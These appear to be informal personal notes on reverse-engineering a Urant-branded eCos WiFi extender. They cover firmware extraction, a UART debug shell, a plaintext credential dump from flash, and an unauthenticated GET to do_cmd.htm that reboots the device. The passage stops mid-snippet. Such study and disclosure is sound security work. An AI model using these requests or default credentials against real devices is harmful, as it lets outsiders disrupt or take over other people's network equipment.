+1921031       0x1D5007        eCos RTOS string reference: "ecos_start"
+1921055       0x1D501F        eCos RTOS string reference: "ecos_mbss_init"
+1921083       0x1D503B        eCos RTOS string reference: "ecos_init"
+1944704       0x1DAC80        eCos RTOS string reference: "ecos.host"
+1954948       0x1DD484        HTML document header
+1954998       0x1DD4B6        HTML document footer
+1960508       0x1DEA3C        Base64 standard index table
+1977394       0x1E2C32        eCos RTOS string reference: "ECOSAPClient"
+1977626       0x1E2D1A        HTML document header
+1981836       0x1E3D8C        HTML document footer
+1981860       0x1E3DA4        HTML document header
+1985336       0x1E4B38        HTML document footer
+1985360       0x1E4B50        HTML document header
+1987627       0x1E542B        HTML document footer
+1988529       0x1E57B1        HTML document header
+1988730       0x1E587A        HTML document footer
+1988754       0x1E5892        HTML document header
+1991563       0x1E638B        Copyright string: "copyright">Urant<script>dw(TT_Copyright)</script>&nbsp;&nbsp;<strong class="text-danger">service@sz-urant.com</strong></span>"
+1991593       0x1E63A9        Copyright string: "Copyright)</script>&nbsp;&nbsp;<strong class="text-danger">service@sz-urant.com</strong></span>"
+1993390       0x1E6AAE        Copyright string: "copyright').html('Urant &copy;');"
+1993857       0x1E6C81        Copyright string: "copyright').html('Urant &copy;');"
+1994345       0x1E6E69        HTML document footer
+1994369       0x1E6E81        HTML document header
+1997178       0x1E797A        Copyright string: "copyright">Urant<script>dw(TT_Copyright)</script>&nbsp;&nbsp;<strong class="text-danger">service@sz-urant.com</strong></span>"
+1997208       0x1E7998        Copyright string: "Copyright)</script>&nbsp;&nbsp;<strong class="text-danger">service@sz-urant.com</strong></span>"
+1999005       0x1E809D        Copyright string: "copyright').html('Urant &copy;');"
+1999472       0x1E8270        Copyright string: "copyright').html('Urant &copy;');"
+1999960       0x1E8458        HTML document footer
+2008943       0x1EA76F        PNG image, 400 x 60, 8-bit colormap, non-interlaced
+2009801       0x1EAAC9        Zlib compressed data, best compression
+2016254       0x1EC3FE        PNG image, 100 x 100, 8-bit/color RGBA, non-interlaced
+2016295       0x1EC427        Zlib compressed data, compressed
+2020914       0x1ED632        GIF image data, version "89a", 100 x 20
+2023332       0x1EDFA4        PNG image, 26 x 20, 8-bit/color RGBA, non-interlaced
+2024302       0x1EE36E        Zlib compressed data, best compression
+2024753       0x1EE531        PNG image, 26 x 20, 8-bit/color RGBA, non-interlaced
+2024852       0x1EE594        Zlib compressed data, best compression
+2025306       0x1EE75A        PNG image, 26 x 20, 8-bit/color RGBA, non-interlaced
+2025405       0x1EE7BD        Zlib compressed data, best compression
+2025885       0x1EE99D        PNG image, 26 x 20, 8-bit/color RGBA, non-interlaced
+2025984       0x1EEA00        Zlib compressed data, best compression
+2026455       0x1EEBD7        PNG image, 26 x 20, 8-bit/color RGBA, non-interlaced
+2026554       0x1EEC3A        Zlib compressed data, best compression
+2027023       0x1EEE0F        PNG image, 102 x 72, 8-bit/color RGBA, non-interlaced
+2028009       0x1EF1E9        Zlib compressed data, best compression
+2029710       0x1EF88E        PNG image, 100 x 100, 8-bit/color RGBA, non-interlaced
+2029788       0x1EF8DC        Zlib compressed data, best compression
+2043384       0x1F2DF8        GIF image data, version "89a", 20 x 20
+2046399       0x1F39BF        PNG image, 100 x 100, 8-bit/color RGBA, non-interlaced
+2046440       0x1F39E8        Zlib compressed data, compressed
+2050434       0x1F4982        PNG image, 100 x 100, 8-bit/color RGBA, non-interlaced
+2050512       0x1F49D0        Zlib compressed data, best compression
+2053425       0x1F5531        PNG image, 400 x 60, 8-bit/color RGB, non-interlaced
+2053503       0x1F557F        Zlib compressed data, best compression
+2066769       0x1F8951        PNG image, 72 x 72, 8-bit/color RGBA, non-interlaced
+2066847       0x1F899F        Zlib compressed data, best compression
+2067416       0x1F8BD8        PNG image, 26 x 20, 8-bit/color RGBA, non-interlaced
+2067723       0x1F8D0B        PNG image, 26 x 20, 8-bit/color RGBA, non-interlaced
+2067876       0x1F8DA4        PNG image, 100 x 100, 8-bit/color RGBA, non-interlaced
+2067954       0x1F8DF2        Zlib compressed data, best compression
+2068861       0x1F917D        PNG image, 100 x 100, 8-bit/color RGBA, non-interlaced
+2068939       0x1F91CB        Zlib compressed data, best compression
+2070760       0x1F98E8        PNG image, 100 x 100, 8-bit/color RGBA, non-interlaced
+2070838       0x1F9936        Zlib compressed data, best compression
+2072527       0x1F9FCF        PNG image, 26 x 20, 8-bit/color RGBA, non-interlaced
+2072626       0x1FA032        Zlib compressed data, best compression
+2073032       0x1FA1C8        PNG image, 26 x 20, 8-bit/color RGBA, non-interlaced
+2073131       0x1FA22B        Zlib compressed data, best compression
+2073552       0x1FA3D0        PNG image, 26 x 20, 8-bit/color RGBA, non-interlaced
+2073651       0x1FA433        Zlib compressed data, best compression
+2074072       0x1FA5D8        PNG image, 26 x 20, 8-bit/color RGBA, non-interlaced
+2074171       0x1FA63B        Zlib compressed data, best compression
+2074591       0x1FA7DF        PNG image, 400 x 60, 8-bit colormap, non-interlaced
+2075449       0x1FAB39        Zlib compressed data, best compression
+2091580       0x1FEA3C        Base64 standard index table
+2094437       0x1FF565        Copyright string: "Copyright (c) 2006 Klaus Hartl (stilbuero.de)"
+2194459       0x217C1B        Copyright string: "Copyright = "&copy;";"
+2201316       0x2196E4        Copyright string: "Copyright = "&copy;";"
+2209413       0x21B685        Copyright string: "Copyright = "&Copiar;";"
+2217489       0x21D611        Copyright string: "Copyright = "&copy;";"
+2224040       0x21EFA8        Copyright string: "Copyright = "&copy;";"
+2231653       0x220D65        HTML document header
+2255033       0x2268B9        HTML document footer
+2255057       0x2268D1        HTML document header
+2258942       0x2277FE        HTML document footer
+2263248       0x2288D0        HTML document header
+2263372       0x22894C        HTML document footer
+2271648       0x22A9A0        CRC32 polynomial table, little endian
+2415276       0x24DAAC        YAFFS filesystem root entry, little endian, type file, v1 root directory
+```
+
+this thing doesn't even run linux hhhhhhh
+it said linux before but seems like it's just something they told u-boot so it boots it :)
+
+Because eCos compiles the operating system kernel, the network stack, the drivers, and the application
+layer into a single, flat executable blob, there is no standard Linux root filesystem directory
+(/bin, /sbin, /etc) to extract. Everything runs directly inside the bare-metal application space.
+
+and bro: Copyright string: "Copyright (c) 2006 Klaus Hartl (stilbuero.de)" => 20 years ago :)
+
+
+mmmm after a lot of going back and forward:
+
+let's ge the web stuff out:
+
+dd if=52480 of=web_assets.dat bs=1 skip=1727940 count=300000
+
+strings web_assets.dat | grep -E "(function|var|input|action)" > web_logic.txt
+
+➜  _factory_backup.bin.extracted git:(main) ✗ cat web_logic.txt 
+Your input is 0!
+===Some 11n statistics variables: 
+../../common/action.c
+ACTION - HT Notify Channel bandwidth action----> 
+ACTION - SMPS action----> 
+ACTION - 20/40 BSS Coexistence Management action----> 
+20/40 BSS CoexMgmt=%d, bForty_Mhz_Intolerant=%d, ignore this action!!
+%s: input arguments error
+%s - IE_MEASUREMENT_REPORT., ChNum=%d StartTime=%lld Duration=%d CCA_Busy_Fraction=%d.
+Dump TR_ENTRY called by function %s(%d)
+For this chip, no specified channel switch function!
+%s(): NotSupported Chip for this function!
+../../common/ba_action.c
+/var/wps_profile.dat
+%s, no tx test frame callback function
+ap_cmm_peer_assoc_req_action
+WARNING : The maximum input size is %d bits long
+get/show variable
+set variablle value
+del variablle
+Press '.' to end input data, <enter> skip to input next data
+Server failure or invalid input
+Multi part input
+rn_init: radix functions require max_keylen be set
+igmp_input rti:NULL
+rsvp_input: Sending packet up old-style socket
+[ccp_datainput]:sending reset request
+Argument to math function outside valid domain
+        <input type="hidden" name="FLG" value="1">
+        <input type="hidden" name="CMD" value="SYS_CONF">
+        <input type="hidden" name="GO" value="allset.html">
+        <input type="hidden" name="CCMD" value="100">
+$(function() {
+	$('#close_btn').on('click', function() {
+	$('#changepwd').on('click', function() {
+	$('#restore').on('click', function() {
+	$('#restore_btn').on('click', function() {
+		var f=document.frmSetup;
+		f.action="do_cmd.htm";
+	$('#reboot').on('click', function() {
+	$('#reboot_btn').on('click', function() {
+		var f=document.frmSetup;
+		f.action="do_cmd.htm";
+	$('#upgrade').on('click', function() {
+				<input type="text" id="admpass" name="admpass" maxlength="16">
+				<input type="text" id="admpass2" name="admpass2" maxlength="16">
+$(function() {
+	$('#close_btn').on('click', function() {
+	$('#back_btn').on('click', function() {
+	$('#adm_btn').on('click', function() {
+		var f=document.frmSetup;
+	var go;
+	var flg;
+	var nowait='0';
+	var cmd;
+	var wait_time=30;
+	var go='';
+	var flg='';
+	var cmd='';
+	var nowait='';
+	function init(){
+		var httpAutErrorArray = new Array(
+		function keyLogin()
+        <form  method="get" action="login.htm" name="LOGIN">
+              <input type="hidden" name="CMD" id="CMD" value= "USERLOGIN"/><input type="hidden" maxlength="16" name="username" value="admin" /> <input type="password" id="pcPassword" name="pcPassword" maxlength="16" value="admin">
+			var f=document.LOGIN;
+			var ErrNum = httpAutErrorArray[0];
+			var mylang1=getCfg("lang");
+			$(function() {
+				$('#lang').on('change', function() {
+				$('#login_btn').on('click', function() {
+					var f=document.LOGIN;
+					var auth = "Basic "+base64_encode("admin:"+f.pcPassword.value);
+				$('#close_btn').on('click', function() {
+		var httpAutErrorArray = new Array(
+		function keyLogin()
+        <form  method="get" action="login.htm" name="LOGIN">
+              <input type="hidden" name="CMD" id="CMD" value= "USERLOGIN"/><input type="hidden" maxlength="16" name="username" value="admin" /> <input type="password" id="pcPassword" name="pcPassword" maxlength="16" value="admin">
+			var f=document.LOGIN;
+			var ErrNum = httpAutErrorArray[0];
+			var mylang1=getCfg("lang");
+			$(function() {
+				$('#lang').on('change', function() {
+				$('#login_btn').on('click', function() {
+					var f=document.LOGIN;
+					var auth = "Basic "+base64_encode("admin:"+f.pcPassword.value);
+				$('#close_btn').on('click', function() {
+input[type=text],
+input[type=password]{
+input[type=text]:focus,
+input[type=password]:focus{
+	input[type=text],
+	input[type=password],
+	input[type=file]{
+
+a7a:
+
+Vulnerability 1:
+<input type="hidden" maxlength="16" name="username" value="admin" /> 
+<input type="password" id="pcPassword" name="pcPassword" maxlength="16" value="admin">
+
+this must be a joke hhhhh; hardcoding default value in the html goood security
+
+Vulnerability 2:
+
+ooo them being sneaky and smart they went and 'encrypted' the password before sending to the backend...
+$('#login_btn').on('click', function() {
+    var f=document.LOGIN;
+    var auth = "Basic "+base64_encode("admin:"+f.pcPassword.value);
+
+wait is that base64 ?
+
+base64 is an encoding mechanism not encryption :); anyone can just watch the traffic; execute a simple middleman capture
+and decode it instantly with echo -n <string> | base64 -d. and voila grab the admin password in clear text;
+
+Vulnerability 3:
+and the biggest of all:
+<input type="hidden" name="CMD" value="SYS_CONF">
+<input type="hidden" name="GO" value="allset.html">
+<input type="hidden" name="CCMD" value="100">
+...
+f.action="do_cmd.htm";
+
+The web administration interface executes structural hardware modifications (like reboots, factory resets, or configuration upgrades) by sending raw HTTP requests targeting a specific virtual page wrapper called do_cmd.htm. It passes commands via hidden form variables like CMD and CCMD (which looks like a direct Command ID mapping, where 100 might equal system configuration actions).
+
+In a poorly constructed eCos environment, these request endpoints frequently lack session token validation (CSRF protection).
+
+If a browser passes a query parameter directly like http://192.168.11.8/do_cmd.htm?CMD=SYS_CONF&CCMD=100, the eCos binary parses the CMD string sequentially. If the parser inside the C file doesn't strictly check the privilege scope of the incoming connection before calling the system execution loop, anyone on the network can trigger actions without authenticating.
+
+I need to test this later :)
+
+
+wait:
+
+when I just pressed enter using the uart signal I took:
+
+CMD>
+ping: sendto error
+
+ping: sendto error
+
+CMD>ls
+cfg         net         os          dbg         
+CMD>cd net
+NET>ls
+show        br          eth         mon         ping        dhcpc       dhcpd       
+arp         pppoe       ntp         dns         ipnat       fw          route       
+timer       http        ifconfig    ated        
+NET>cd ..
+ping: sendto error
+
+ping: sendto error
+
+
+CMD>cd os
+OS>ls
+thread      mem         spi         reg         cpuload     cpubusy     
+OS>
+
+
+found a live debuging shell from eCos RTOS
+
+OS>reg
+reg r/read address
+reg w/write address value
+
+OS>mem
+Memory system: 
+   Total 3221k, Free 1490k, Largest free block 1489k
+Network stack mbuf stats:
+         mbufs 337, clusters 200, free clusters 6
+   Failed to get 0 times
+   Waited to get 0 times
+   Drained queues to get 0 times
+   Mbufs pool: total  204800, free  161408, blocksize  128
+   Clust pool: total 2048000, free 1224704, blocksize 4096
+VM zone 'ripcb':
+   Total: 256, Free: 256, Allocs: 111, Frees: 111, Fails: 0
+VM zone 'tcpcb':
+   Total: 256, Free: 254, Allocs: 26, Frees: 24, Fails: 0
+VM zone 'udpcb':
+   Total: 256, Free: 255, Allocs: 7, Frees: 6, Fails: 0
+VM zone 'socket':
+   Total: 256, Free: 253, Allocs: 144, Frees: 141, Fails: 0
+
+
+hhhhh we can just read and write to the registers and memory ? that's great !!!
+
+```
+CFG>prof show
+#PROFILE
+#VER_2_1
+SYS_ADMPASS=admin
+SYS_DAYLITE=0
+SYS_DOMAIN=ap.login
+SYS_IDLET=0
+SYS_NAME=BFROS_WIFI
+SYS_RM_EN=0
+SYS_RM_IP=0.0.0.0
+SYS_RM_PORT=8080
+SYS_TZONE=45
+SYS_USERS=admin
+SYS_NTPTYPE=0
+SYS_NTPSRV=0.pool.ntp.org
+SYS_DAYLITE_SM=16
+SYS_DAYLITE_SD=2
+SYS_DAYLITE_EM=2
+SYS_DAYLITE_ED=2
+SYS_OPMODE=2
+SYS_LM=1
+SYS_LANGUAGE=auto
+LAN_DHCPD_DOMAIN=BFROS_WIFI
+LAN_DHCPD_EN=0
+LAN_DHCPD_END=192.168.11.250
+LAN_DHCPD_LEASET=86400
+LAN_DHCPD_START=192.168.11.60
+LAN_IP=192.168.11.1
+LAN_MSK=255.255.255.0
+LAN_IP_MODE=1
+LAN_PHY=0
+WAN_IP_MODE=2
+WAN_IP=0.0.0.0
+WAN_MSK=0.0.0.0
+WAN_GW=0.0.0.0
+WAN_IP_MANY=0
+WAN_DHCP_MAC_EN=0
+WAN_MTU=1500
+WAN_DHCP_MTU=1500
+WAN_DHCP_MAN=0
+WLN_BasicRate=15
+WLN_BeaconPeriod=100
+WLN_Channel=0
+WLN_DtimPeriod=1
+WLN_RTSThreshold=2347
+WLN_TxPower=100
+WLN_TxRate=0
+WLN_RADIUS_Server=0;0;0;0
+WLN_RADIUS_Port=0;0;0;0
+WLN_MODE=9
+WLN_BGProtection=0
+WLN_PktAggregate=1
+WLN_ShortSlot=1
+WLN_IEEE80211H=0;0;0;0
+WLN_ANTENNA=2
+WLN_TxBurst=1
+WLN_WirelessMode=9
+WLN_CountryCode=CN
+WLN_HideSSID=0;0;0;0
+WLN_BssidNum=1
+WLN_AutoChannelSelect=2
+WLN_WdsEnable=0
+WLN_WdsEncrypType=NONE;NONE;NONE;NONE
+WLN_DefaultKeyID=1;1;1;1
+WLN_SSID1=Extender-88b2c9
+WLN_HT_OpMode=0
+WLN_HT_BW=1
+WLN_HT_GI=1
+WLN_HT_MCS=33
+WLN_HT_HTC=1
+WLN_HT_RDG=1
+WLN_HT_LinkAdapt=0
+WLN_HT_EXTCHA=1
+WLN_HT_AMSDU=1
+WLN_EncrypType=AES;AES;AES;AES
+WLN_WdsPhyMode=CCK;CCK;CCK;CCK
+WLN_ModuleName=BFROS_WIFI
+WLN_HT_STBC=1
+WLN_HT_DisallowTKIP=1
+WLN_HT_40MHZ_INTOLERANT=0
+WLN_HT_RxStream=2
+WLN_HT_TxStream=2
+WLN_WiFiTest=0
+WLN_FragThreshold=2346
+WLN_TxPreamble=0
+WLN_WmmCapable=1
+WLN_APSDCapable=1
+WLN_DLSCapable=0
+WLN_APAifsn=3;7;1;1
+WLN_APCwmin=4;4;3;2
+WLN_APCwmax=6;10;4;3
+WLN_APTxop=0;0;94;47
+WLN_APACM=0;0;0;0
+WLN_BSSAifsn=3;7;2;2
+WLN_BSSCwmin=4;4;3;2
+WLN_BSSCwmax=10;10;4;3
+WLN_BSSTxop=0;0;94;47
+WLN_BSSACM=0;0;0;0
+WLN_AckPolicy=0;0;0;0
+WLN_HT_AutoBA=1
+WLN_HT_MpduDensity=0
+WLN_HT_BAWinSize=64
+WLN_HT_BADecline=0
+WLN_session_timeout_interval=0
+WLN_idle_timeout_interval=0
+WLN_AccessPolicy0=0
+WLN_AccessPolicy1=0
+WLN_AccessPolicy2=0
+WLN_AccessPolicy3=0
+WLN_wanConnectionMode=BRIDGE
+WLN_WapiEnable=0
+WLN_WscModeOption=1
+WLN_WscConfigured=1
+WLN_WscPinCode=0
+WLN_WdsList=
+WLN_Wds1Key=12345678
+WLN_Wds2Key=12345678
+WLN_Wds3Key=12345678
+WLN_Wds4Key=12345678
+WLN_WdsDefaultKeyID=1;1;1;1
+WLN_CountryRegion=1
+WLN_CountryRegionABand=5
+WLN_DisableOLBC=0
+WLN_TxAntenna=2
+WLN_RxAntenna=2
+WLN_TurboRate=0
+WLN_NoForwarding=0;0;0;0
+WLN_NoForwardingBTNBSSID=0
+WLN_SecurityMode=3
+WLN_VLANEnable=0
+WLN_VLANName=
+WLN_VLANID=0
+WLN_VLANPriority=0
+WLN_WscConfMode=7
+WLN_WscConfStatus=1
+WLN_WscAKMP=1
+WLN_WscActionIndex=9
+WLN_WscRegResult=1
+WLN_WscUseUPnP=1
+WLN_WscUseUFD=0
+WLN_WscSSID=BFROS_WIFI
+WLN_WscKeyMGMT=WPA-EAP
+WLN_WscConfigMethod=138
+WLN_WscAuthType=1
+WLN_WscEncrypType=1
+WLN_WscNewKey=scaptest
+WLN_IEEE8021X=0;0;0;0
+WLN_CSPeriod=6
+WLN_PreAuth=0;0;0;0
+WLN_AuthMode=WPA2PSK;WPA2PSK;WPA2PSK;WPA2PSK
+WLN_RekeyInterval=3600;3600;3600;3600
+WLN_RekeyMethod=DISABLE;DISABLE;DISABLE;DISABLE
+WLN_PMKCachePeriod=10;10;10;10
+WLN_WPAPSK1=88888888
+WLN_Key1Type=0;0;0;0
+WLN_Key1Str1=11111
+WLN_Key2Type=0;0;0;0
+WLN_Key2Str1=11111
+WLN_Key3Type=0;0;0;0
+WLN_Key3Str1=11111
+WLN_Key4Type=0;0;0;0
+WLN_Key4Str1=11111
+WLN_HSCounter=0
+WLN_HT_PROTECT=1
+WLN_HT_MIMOPS=3
+WLN_AccessControlList0=
+WLN_AccessControlList1=
+WLN_AccessControlList2=
+WLN_AccessControlList3=
+WLN_WirelessEvent=0
+WLN_RADIUS_Acct_Server=0;0;0;0
+WLN_RADIUS_Acct_Port=1813
+WLN_RADIUS_Acct_Key=0
+WLN_staWirelessMode=9
+WLN_upnpEnabled=0
+WLN_pppoeREnabled=0
+WLN_RDRegion=JAP
+WLN_NewVersion=0
+WLN_SSID2=
+WLN_SSID3=
+WLN_SSID4=
+WLN_WPAPSK2=88888888
+WLN_WPAPSK3=88888888
+WLN_WPAPSK4=88888888
+WLN_Key1Str2=22222
+WLN_Key1Str3=33333
+WLN_Key1Str4=44444
+WLN_Key2Str2=22222
+WLN_Key2Str3=33333
+WLN_Key2Str4=44444
+WLN_Key3Str2=22222
+WLN_Key3Str3=33333
+WLN_Key3Str4=44444
+WLN_Key4Str2=22222
+WLN_Key4Str3=33333
+WLN_Key4Str4=44444
+WLN_RADIUS_Key1=12345
+WLN_RADIUS_Key2=12345
+WLN_RADIUS_Key3=12345
+WLN_RADIUS_Key4=12345
+WLN_ApCliEnable=0
+WLN_ApCliBssid=
+WLN_ApCliAuthMode=
+WLN_ApCliEncrypType=
+WLN_ApCliKey1Type=0
+WLN_ApCliKey1Str=
+WLN_ApCliKey2Str=
+WLN_ApCliKey3Str=
+WLN_ApCliKey4Str=
+WLN_ApCliDefaultKeyID=0
+WLN_ApCliWPAPSK=
+WLN_ApCliSsid=ECOSAPClient
+WLN_HT_BSSCoexistence=0
+WLN_WepKeyLen=0;0;0;0
+WLN_RadioOn=1
+WLN_IgmpSnEnable=0
+WLN_SSIDIndex=0
+WLN_ApCliKey2Type=0
+WLN_ApCliKey3Type=0
+WLN_ApCliKey4Type=0
+WLN_PMFMFPC=0
+WLN_PMFMFPR=0
+WLN_PMFSHA256=0
+WLN_MACRepeaterEn=0
+WLN_MACRepeaterOuiMode=0
+WLN_AutoChannelSkipList=14
+DDNS_EN=0
+POE_AUTO=0
+POE_IDLET=300
+POE_MTU=1492
+POE_PASS=
+POE_SVC=
+POE_USER=
+POE_SIPE=0
+POE_SIP=0.0.0.0
+POE_EN=1
+POE_DFLRT=1
+PTP_AUTO=1
+PTP_HOST=1.0.1.2-urant-p1R-auto
+PTP_ID=5
+PTP_IDLET=0
+PTP_IP=0.0.0.0
+PTP_MSK=255.255.255.0
+PTP_MTU=1400
+PTP_PASS=pass
+PTP_SVR=0.0.0.0
+PTP_USER=pptp_user
+PTP_SVRDM=
+PTP_SVRD_SEL=0
+PTP_WANIF=0
+PTP_CLONE_MAC=00:00:00:00:00:00
+PTP_DHCP_MAC_EN=0
+PTP_MPPE_EN=0
+PTP_GW=0.0.0.0
+NAT_DMZ_EN=0
+NAT_DMZ_HOST=
+NAT_ALG_FTP=1
+NAT_ALG_NM=0
+NAT_ALG_PPTP=1
+NAT_ALG_MSN=0
+NAT_ALG_IPSEC=1
+NAT_EN=1
+NAT_ALG_FTP_NSP=0
+NAT_ALG_L2TP=1
+NAT_ALG_RTSP=1
+NAT_ALG_SIP=1
+FW_FLT_CLN_EN=0
+FW_FLT_MAC_EN=0
+FW_FLT_MAC_MODE=0
+FW_FLT_URL_EN=0
+FW_FRAG_OK=1
+FW_HACKER_ATT=1
+FW_ICMP_RESP=1
+FW_IDENT_DIS=1
+FW_NBIOS_DROP=0
+FW_PING_DIS_LAN=0
+FW_PING_DIS_WAN=0
+FW_PSCAN_DROP=1
+FW_IP_SPOOF=1
+FW_SHORT=1
+FW_PING_DEATH=1
+FW_LAND=1
+FW_SNORK=1
+FW_UDP_PLOOP=1
+FW_TCP_NULL=1
+FW_SMURF=1
+FW_SYN_FLOOD=1
+FW_SYNF_RATE=150
+FW_EN=0
+UPP_AD_TIME=1800
+UPP_EN=0
+UPP_PORT=1780
+UPP_SUB_TIMEOUT=1800
+LOG_RM_EN=0
+LOG_RM_TYPE=0
+LOG_SYS_IP=0.0.0.0
+LOG_MAIL_IP=0.0.0.0
+LOG_E_MAIL=
+LOG_MODE=5
+L2T_AUTO=0
+L2T_IDLET=100
+L2T_IP=0.0.0.0
+L2T_MSK=255.255.255.0
+L2T_MTU=12
+L2T_PASS=7628Kap
+L2T_SVR=0.0.0.0
+L2T_USER=l2tp_user
+L2T_SVRDM=
+L2T_SVRD_SEL=0
+L2T_WANIF=0
+L2T_CLONE_MAC=00:00:00:00:00:00
+L2T_DHCP_MAC_EN=0
+L2T_GW=0.0.0.0
+DNS_EN=1
+DNS_FIX=0
+DNS_DEF=0.0.0.0
+QOS_EN=0
+```
+
+
+SYS_ADMPASS=admin
+WLN_WPAPSK1=88888888
+L2T_PASS=7628Kap
+
+and this shows that the password sits there in plain text inside the flash memory; no hashing no nothing !
+
+khkhkhkh FW_EN=0 firewall is disabled hhhhhhh
+
+The firmware has built-in code routines to prevent severe attacks like SYN floods, Ping of Death, and IP spoofing—but the firewall is turned completely off (0) out of the box. The device relies entirely on the fact that it sits behind a NAT layer, leaving its local interfaces exposed to any device on the network.
+
+
+
+wtf:
+➜  ~ curl -v "http://192.168.11.1/do_cmd.htm?CMD=SYS_CONF&CCMD=101"
+*   Trying 192.168.11.1:80...
+* Connected to 192.168.11.1 (192.168.11.1) port 80
+* using HTTP/1.x
+> GET /do_cmd.htm?CMD=SYS_CONF&CCMD=101 HTTP/1.1
+> Host: 192.168.11.1
+> User-Agent: curl/8.14.1
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 Ok
+< Server: HTTPD
+< Date: Thu, 01 Jan 1970 00:07:17 GMT
+< Pragma: no-cache
+< Cache-Control: no-cache
+< Content-Type: text/html; charset=
+< Last-Modified: Mon, 15 Apr 2024 15:12:19 GMT
+< Connection: close
+< 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, user-scalable=no" />
+  <link rel="stylesheet" type="text/css" href="./static/css/style.css">
+  <script type="text/javascript" src="./static/js/jquery.js"></script>
+  <script type="text/javascript" src="./static/js/jquerycookie.js"></script>
+  <script type="text/javascript" src="./static/js/config.js"></script>
+  <script language="javascript" type="text/javascript">
+		
+		addCfg('mylang',0x01190200,'auto');
+
+		
+		
+		var httpAutErrorArray = new Array(
+		
+		0
+		
+		, 0,0 );
+		includeLanguage(getCfg('mylang'));
+		
+		function keyLogin()
+		{
+ 			if (event.keyCode==13)
+   			document.getElementById("login_btn").click();
+		}
+
+</script> 
+<script src="./static/js/common.js"></script> 
+</head>
+
+<body style="margin:0; padding:0;">
+<div class="container" align="center">
+  <div>
+    <div class="row">
+	 <div class="col-12" style="padding:0 0 1% 0;">
+        <div align="left" class="my-toper">
+            <div class="my-header">
+                <img src="./static/images/logo.png" class="my-logo">
+				<div class="my-info">
+					<span id="login_title1">
+					<script>dw(TT_SetWifiExt)</script></span>
+                	<br>
+            		<span style="font-size:12px;" id="login_title2"><script>dw(TT_SetWifiExtInfo)</script></span></span>
+               	</div>
+            </div>
+        </div>
+        <br><br><br><br>
+        <form  method="get" action="login.htm" name="LOGIN">
+        <table class="gridtable">
+          <tr>
+            <td colspan="2" align="center" style="font-size:18px; font-weight:bold;" id="login_info"><script>dw(TT_UsreLogin)</script></td>
+          </tr>
+          <tr style="display:none">
+            <td class="gl" id="login_msg"><script>dw(TT_LoginPassword)</script>:</td>
+            <td class="gr">
+              <input type="hidden" name="CMD" id="CMD" value= "USERLOGIN"/><input type="hidden" maxlength="16" name="username" value="admin" /> <input type="password" id="pcPassword" name="pcPassword" maxlength="16" value="admin">
+            </td>
+          </tr>
+          <tr>
+            <td class="gl" id="login_language"><script>dw(TT_Language)</script>:</td>
+            <td class="gr">
+              <select class="select" id="lang" name="lang">
+                <option value="auto"><script>dw(TT_Auto)</script></option>
+              </select>
+            </td>
+          </tr>
+        </table>
+        <br>
+        <table>
+          <tr>
+            <td>
+              <button type="button" class="btn" id="login_btn"><script>dw(TT_Login)</script></button>
+            </td>
+          </tr>
+        </table>
+        </form>
+        <br><br>
+		<div align="center">
+		 <span style="font-size:12px" id="login_copyright">Urant<script>dw(TT_Copyright)</script>&nbsp;&nbsp;<strong class="text-danger">service@sz-urant.com</strong></span>
+		</div>
+		<br>
+		<div align="center">
+		 <span style="font-size:12px" id="softVersion"></span>
+		</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="window-wrapper" id="my-alert" style="display:none;">
+  <div class="window">
+    <div style="float:right; padding:10px 10px 0 0;"><img src="./static/images/close.png" height="30" id="close_btn"></div>
+    <div class="window-body" style="text-align: center;">
+      <p style="font-size:16px"><span id="err-msg"></span></p>
+    </div>
+  </div>
+</div>
+
+<script>
+		
+			
+			
+			addCfg('lang',0x01190200,'auto');
+
+			fmversion="1.0.1.2-urant-p1R-auto";
+			
+		
+			$('#pcPassword').attr('placeholder',TT_EnterLoginPass);
+			
+			var f=document.LOGIN;
+			var ErrNum = httpAutErrorArray[0];
+			switch(ErrNum)
+			{
+				case 1:
+				alert(MSG_LoginPassError);
+				location.href = "#";
+				break;
+				case 2:
+					alert("error");
+					location.href = "#";
+					break;
+				case 3:
+					document.location = 'http://' + document.domain + "/first.htm?tt=" + new Date().getTime();
+					break;
+				case 0:
+				default:
+					break;
+			}
+			var mylang1=getCfg("lang");
+			$(function() {
+				$('#softVersion').html(fmversion);
+				document.title = TT_APManagementSystem;
+				$("#lang").val(mylang1);
+				cfg2Form(f);
+				$('#lang').on('change', function() {
+					if ($('#lang').get(0).selectedIndex == 1) {
+						$('#login_info').html('管理员登录');
+						$('#login_msg').html('登录密码:');
+						$('#login_language').html('选择语言:');
+						$('#login_btn').html('登录');
+						$('#pcPassword').attr('placeholder','请填写登录密码');
+						$('#login_title1').html('设置WiFi扩展器');
+						$('#login_title2').html('对您家的无线网络进行信号扩展，穿墙杠杠的');
+						//$('#login_copyright').html('Urant &copy;');
+					} else {
+						$('#login_info').html('User Login');
+						$('#login_msg').html('Login Password:');
+						$('#login_language').html('Language:');
+						$('#login_btn').html('Login');
+						$('#pcPassword').attr('placeholder','Please fill in the password!');
+						$('#login_title1').html('Extender WiFi Settings');
+						$('#login_title2').html('Extend the signal of your home WiFi network, through the wall');
+						//$('#login_copyright').html('Urant &copy;');
+					}
+				});
+				$('#login_btn').on('click', function() {
+					var f=document.LOGIN;
+					if (!ChkVaildChar($('#pcPassword').val(),TT_Password,1)) return false;
+					var auth = "Basic "+base64_encode("admin:"+f.pcPassword.value);
+					document.cookie = "Authorization="+escape(auth)+";path=/";
+					f.submit();
+					return true;
+				});
+				$('#close_btn').on('click', function() {
+					window.location.reload();
+				});	
+			});   
+		</script>
+</body>
+</html>
+* shutting down connection #0
+➜  ~
+
+
+we just made it reboot :)
+you don't have to be an admin or anything just be on the same network !!!
+
+also look at this:
+var auth = "Basic "+base64_encode("admin:"+f.pcPassword.value);
+document.cookie = "Authorization="+escape(auth)+";path=/";
+f.submit();
+
+Cookie Theft Vectors via Unprotected JavaScript Storage
+
+JACKPOT:
+
+we've just successfully validated a major architectural flaw: Unauthenticated Remote Command Execution /
+Denial of Service (DoS) via direct parameter manipulation on do_cmd.htm.
+
+mmmmm let's use ghidra to find the other commands:
+I retraived some really weird data:
+
+$('#restore_btn').on('click', function() {
+    var f=document.frmSetup;
+    f.FLG.value = 1;
+    f.CCMD.value = 1;        
+    f.action="do_cmd.htm";
+    f.submit();
+});
+
+$('#reboot_btn').on('click', function() {
+    var f=document.frmSetup;
+    f.FLG.value = 0;
+    f.CCMD.value = 0;        
